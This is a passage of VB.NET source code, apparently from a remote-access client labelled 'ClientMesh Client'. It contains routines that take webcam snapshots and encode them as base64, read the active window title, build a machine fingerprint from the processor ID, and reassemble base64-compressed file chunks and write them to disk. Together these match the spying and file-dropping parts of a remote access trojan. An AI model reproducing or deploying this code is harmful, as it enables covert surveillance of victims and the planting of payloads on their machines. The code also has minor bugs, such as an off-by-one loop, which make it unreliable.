            versionInfo.dwOSVersionInfoSize = Runtime.InteropServices.Marshal.SizeOf(GetType(OSVERSIONINFOEX))
     
            If GetVersionEx(versionInfo) Then
                If versionInfo.szCSDVersion.ToString.Contains("Service Pack 1") Then
                    runningOS += " SP1"
                End If
                If versionInfo.szCSDVersion.ToString.Contains("Service Pack 2") Then
                    runningOS += " SP2"
                End If
                If versionInfo.szCSDVersion.ToString.Contains("Service Pack 3") Then
                    runningOS += " SP3"
                End If
                If versionInfo.szCSDVersion.ToString.Contains("Service Pack 4") Then
                    runningOS += " SP4"
                End If
                If versionInfo.szCSDVersion.ToString.Contains("Service Pack 5") Then
                    runningOS += " SP5"
                End If
                If versionInfo.szCSDVersion.ToString.Contains("Service Pack 6") Then
                    runningOS += " SP6"
                End If
                If versionInfo.szCSDVersion.ToString.Contains("Service Pack 7") Then
                    runningOS += " SP7"
                End If
                If versionInfo.szCSDVersion.ToString.Contains("Service Pack 8") Then
                    runningOS += " SP8"
                End If
                If versionInfo.szCSDVersion.ToString.Contains("Service Pack 9") Then
                    runningOS += " SP9"
                End If
            End If
     
            Return runningOS
        End Function ' find the os version
        <Runtime.InteropServices.DllImport("kernel32.dll")> _
        Private Shared Function GetVersionEx(ByRef osVersionInfo As OSVERSIONINFOEX) As Boolean
        End Function '""
     
        <Runtime.InteropServices.StructLayout(Runtime.InteropServices.LayoutKind.Sequential)> _
        Structure OSVERSIONINFOEX
            Public dwOSVersionInfoSize As Integer
            Public dwMajorVersion As Integer
            Public dwMinorVersion As Integer
            Public dwBuildNumber As Integer
            Public dwPlatformId As Integer
            <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.ByValTStr, SizeConst:=128)> _
            Public szCSDVersion As String
            Public wServicePackMajor As Short
            Public wServicePackMinor As Short
            Public wSuiteMask As Short
            Public wProductType As Byte
            Public wReserved As Byte
        End Structure '""
        Private Shared Function OSVersionNoRevision(ByVal ver As Version) As String
            Return ((ver.Major.ToString() & ".") + ver.Minor.ToString() & ".") + ver.Build.ToString()
        End Function '""
        Private Declare Function GetForegroundWindow Lib "user32.dll" () As Int32
        Private Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hwnd As Int32, ByVal lpString As String, ByVal cch As Int32) As Int32
        Public Shared Function GetActiveWindowTitle() As String
            Dim MyStr As String
            MyStr = New String(Chr(0), 100)
            GetWindowText(GetForegroundWindow, MyStr, 100)
            MyStr = MyStr.Substring(0, InStr(MyStr, Chr(0)) - 1)
     
            Return MyStr
        End Function
    End Class
     
     
     
    Public Class unique
        Public Shared Function ID() As String
            Dim guid2 As String = String.Empty 'declaring variables for guid
            Try
                Dim manc As New ManagementClass("win32_processor")
                Dim mobc As ManagementObjectCollection = manc.GetInstances()
                For Each mo As ManagementObject In mobc
                    If guid2 = "" Then
                        guid2 = mo.Properties("processorID").Value.ToString() 'getting the processor id and using it as guid.
                        Exit For
                    End If
                Next
            Catch
                guid2 = Environment.UserName
            End Try
     
            Dim md5Obj As New System.Security.Cryptography.MD5CryptoServiceProvider
            Dim bytes() As Byte = System.Text.Encoding.ASCII.GetBytes(guid2 & sysinfo.machinename)
            bytes = md5Obj.ComputeHash(bytes)
            Dim strResult As String = ""
            For Each b As Byte In bytes
                strResult += b.ToString("x2")
            Next
            Return strResult
     
        End Function
        Private Shared Function GetMACAddress() As String
     
            Dim mc As ManagementClass = New ManagementClass("Win32_NetworkAdapterConfiguration")
            Dim moc As ManagementObjectCollection = mc.GetInstances()
            Dim MACAddress As String = String.Empty
            For Each mo As ManagementObject In moc
     
                If (MACAddress.Equals(String.Empty)) Then
                    If CBool(mo("IPEnabled")) Then MACAddress = mo("MacAddress").ToString()
     
                    mo.Dispose()
                End If
                MACAddress = MACAddress.Replace(":", String.Empty)
     
            Next
            Return MACAddress
        End Function
        Private Shared Function GetVolumeSerial(Optional ByVal strDriveLetter As String = "C") As String
            Try
                Dim disk As ManagementObject = New ManagementObject(String.Format("win32_logicaldisk.deviceid=""{0}:""", strDriveLetter))
                disk.Get()
                Return disk("VolumeSerialNumber").ToString()
            Catch
                Return "N/A"
            End Try
     
        End Function
    End Class
    Public Class upfile
        Public id As String
        Public filestring As String = ""
        Public Sub New(ByVal idto As String)
            id = idto
        End Sub
        Public Sub addpart(ByVal part As String)
            Try
                filestring &= part
            Catch
            End Try
     
        End Sub
        Public Function finish(ByVal path As String) As Boolean
            Dim files As Byte() = file64.Decompress(Convert.FromBase64String(filestring.Trim))
            Try
                System.IO.File.WriteAllBytes(path, files)
                Return True
            Catch
                Return False
            End Try
     
        End Function
    End Class
    <Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
    Partial Class visibleform
        Inherits System.Windows.Forms.Form
     
        'Form overrides dispose to clean up the component list.
        <System.Diagnostics.DebuggerNonUserCode()> _
        Protected Overrides Sub Dispose(ByVal disposing As Boolean)
            Try
                If disposing AndAlso components IsNot Nothing Then
                    components.Dispose()
                End If
            Finally
                MyBase.Dispose(disposing)
            End Try
        End Sub
     
        'Required by the Windows Form Designer
        Private components As System.ComponentModel.IContainer
     
        'NOTE: The following procedure is required by the Windows Form Designer
        'It can be modified using the Windows Form Designer.  
        'Do not modify it using the code editor.
        <System.Diagnostics.DebuggerStepThrough()> _
        Private Sub InitializeComponent()
            Me.Button1 = New System.Windows.Forms.Button()
            Me.SuspendLayout()
            '
            'Button1
            '
            Me.Button1.Location = New System.Drawing.Point(12, 12)
            Me.Button1.Name = "Button1"
            Me.Button1.Size = New System.Drawing.Size(201, 61)
            Me.Button1.TabIndex = 0
            Me.Button1.Text = "EXIT"
            Me.Button1.UseVisualStyleBackColor = True
            '
            'visible
            '
            Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
            Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
            Me.ClientSize = New System.Drawing.Size(225, 85)
            Me.Controls.Add(Me.Button1)
            Me.Font = New System.Drawing.Font("Segoe UI", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
            Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow
            Me.Name = "visible"
            Me.Text = "ClientMesh Client"
            Me.ResumeLayout(False)
     
        End Sub
        Friend WithEvents Button1 As System.Windows.Forms.Button
    End Class
    Public Class visibleform
     
        Private Sub visible_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
     
        End Sub
     
        Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
            Application.Exit()
     
        End Sub
        Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
            Application.Exit()
        End Sub
     
        Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
            Me.Location = New Point(Screen.PrimaryScreen.WorkingArea.Width - Me.Width - 5, Screen.PrimaryScreen.WorkingArea.Height - Me.Height - 5)
        End Sub
    End Class
     
     
     
     
     
    Public Class webcam
        Public Shared quality As Integer = 1
        Public Shared Function Compress(ByVal data As Byte()) As Byte()
            Dim ms As New MemoryStream()
            Dim ds As New DeflateStream(ms, CompressionMode.Compress)
            ds.Write(data, 0, data.Length)
            ds.Flush()
            ds.Close()
            Return ms.ToArray()
        End Function
        Public Shared Function Decompress(ByVal data As Byte()) As Byte()
            Const BUFFER_SIZE As Integer = 256
            Dim tempArray As Byte() = New Byte(BUFFER_SIZE - 1) {}
            Dim tempList As New List(Of Byte())()
            Dim count As Integer = 0, length As Integer = 0
     
            Dim ms As New MemoryStream(data)
            Dim ds As New DeflateStream(ms, CompressionMode.Decompress)
     
            While (InlineAssignHelper(count, ds.Read(tempArray, 0, BUFFER_SIZE))) > 0
                If count = BUFFER_SIZE Then
                    tempList.Add(tempArray)
                    tempArray = New Byte(BUFFER_SIZE - 1) {}
                Else
                    Dim temp As Byte() = New Byte(count - 1) {}
                    Array.Copy(tempArray, 0, temp, 0, count)
                    tempList.Add(temp)
                End If
                length += count
            End While
     
            Dim retVal As Byte() = New Byte(length - 1) {}
     
            count = 0
            For Each temp As Byte() In tempList
                Array.Copy(temp, 0, retVal, count, temp.Length)
                count += temp.Length
            Next
     
            Return retVal
        End Function
        Private Shared Function InlineAssignHelper(Of T)(ByRef target As T, ByVal value As T) As T
            target = value
            Return value
        End Function
     
        Public Shared Function imagetobyte(ByVal image As Image) As Byte()
     
            Dim ms As New IO.MemoryStream
            image.Save(ms, Imaging.ImageFormat.Jpeg)
            Dim b As Byte() = ms.GetBuffer()
            Return b
            ms.Dispose()
        End Function
        Public Shared Function PicResizeByWidth(ByVal SourceImage As Image, ByVal NewWidth As Integer) As Bitmap
            Dim SizeFactor As Decimal = NewWidth / SourceImage.Width
            Dim NewHeigth As Integer = SizeFactor * SourceImage.Height
            Dim NewImage As New Bitmap(NewWidth, NewHeigth)
            Using G As Graphics = Graphics.FromImage(NewImage)
                G.InterpolationMode = InterpolationMode.HighQualityBicubic
                G.DrawImage(SourceImage, New Rectangle(0, 0, NewWidth, NewHeigth))
                G.Dispose()
            End Using
            Return NewImage
            NewImage.Dispose()
            NewImage = Nothing
            PicResizeByWidth.Dispose()
        End Function
        Shared towebcam As Boolean = False
        Shared Sub startcam()
            Dim piccapture As New PictureBox()
            piccapture.Size = New Size(320, 240)
     
            iDevice = 0
            '  OpenPreviewWindow()
            hHwnd = capCreateCaptureWindowA(iDevice, WS_VISIBLE Or WS_CHILD, 0, 0, 640, _
              480, piccapture.Handle.ToInt32, 0)
     
            towebcam = True
        End Sub
        Public Shared Function imgstr() As String
            If towebcam = True Then
            Else
                startcam()
            End If
     
            ' Connect to device
            SendMessage(hHwnd, WM_CAP_DRIVER_CONNECT, iDevice, 0)
            SendMessage(hHwnd, WM_CAP_EDIT_COPY, 0, 0)
     
     
     
            Dim data As IDataObject
            Dim bm As Bitmap = Nothing
            ClosePreviewWindow()
            data = Clipboard.GetDataObject()
            System.Threading.Thread.Sleep(50)
            If My.Computer.Clipboard.ContainsImage Then
                bm = My.Computer.Clipboard.GetImage
                Select Case quality
                    Case 1
                        bm = SaveJPGWithCompressionSetting(PicResizeByWidth(bm, 280), 20)
                    Case 2
                        bm = SaveJPGWithCompressionSetting(bm, 20)
                    Case 3
                        bm = SaveJPGWithCompressionSetting(bm, 30)
     
                    Case Else
                        bm = SaveJPGWithCompressionSetting(PicResizeByWidth(bm, 280), 20)
                End Select
            End If
     
     
            If bm Is Nothing Then
                Return "NONE"
            Else
                Dim r As Byte() = imagetobyte(bm)
                Dim str As String = Convert.ToBase64String(r)
                Return str
            End If
     
        End Function
        Public Shared errOcr As Boolean
        Public Shared Function SaveJPGWithCompressionSetting(ByVal image As Image, ByVal lCompression As Long) As Image
            Dim eps As EncoderParameters = New EncoderParameters(1)
            eps.Param(0) = New EncoderParameter(System.Drawing.Imaging.Encoder.Quality, lCompression)
            Dim ici As ImageCodecInfo = GetEncoderInfo("image/jpeg")
            Dim newimage As Image
            Dim ImageStream As New MemoryStream
            image.Save(ImageStream, ici, eps)
            newimage = image.FromStream(ImageStream)
            ici = Nothing
            image.Dispose()
            image = Nothing
            Return newimage
        End Function
        Public Shared Function GetEncoderInfo(ByVal mimeType As String) As ImageCodecInfo
            Dim j As Integer
            Dim encoders As ImageCodecInfo()
            encoders = ImageCodecInfo.GetImageEncoders()
            For j = 0 To encoders.Length
                If encoders(j).MimeType = mimeType Then
                    Return encoders(j)
                End If
            Next j '        
            Return Nothing
        End Function
        Dim lstdevices As New ListBox
     
     
     
    #Region "webcam functions"
        Const WM_CAP As Short = &H400S
        Const WM_CAP_DRIVER_CONNECT As Integer = WM_CAP + 10
        Const WM_CAP_DRIVER_DISCONNECT As Integer = WM_CAP + 11
        Const WM_CAP_EDIT_COPY As Integer = WM_CAP + 30
     
        Const WS_CHILD As Integer = &H40000000
        Const WS_VISIBLE As Integer = &H10000000
     
     
     
        Public Shared iDevice As Integer = 0  ' Normal device ID
        Public Shared hHwnd As Integer  ' Handle value to preview window
     
        ' Declare function from AVI capture DLL.
     
        Declare Function SendMessage Lib "user32" Alias "SendMessageA" _
            (ByVal hwnd As Integer, ByVal wMsg As Integer, ByVal wParam As Integer, _
             ByVal lParam As Object) As Integer
     
     
     
        Declare Function DestroyWindow Lib "user32" (ByVal hndw As Integer) As Boolean
     
        Declare Function capCreateCaptureWindowA Lib "avicap32.dll" _
            (ByVal lpszWindowName As String, ByVal dwStyle As Integer, _
            ByVal x As Integer, ByVal y As Integer, ByVal nWidth As Integer, _
            ByVal nHeight As Short, ByVal hWndParent As Integer, _
            ByVal nID As Integer) As Integer
     
     
     
        Public Shared Sub killwindow()
     
            DestroyWindow(hHwnd)
            towebcam = False
        End Sub
        Public Shared Sub ClosePreviewWindow()
            ' Disconnect from device
            SendMessage(hHwnd, WM_CAP_DRIVER_DISCONNECT, iDevice, 0)
     
            ' close window
           
        End Sub
     
    #End Region
     
    End Class
     
    End Namespace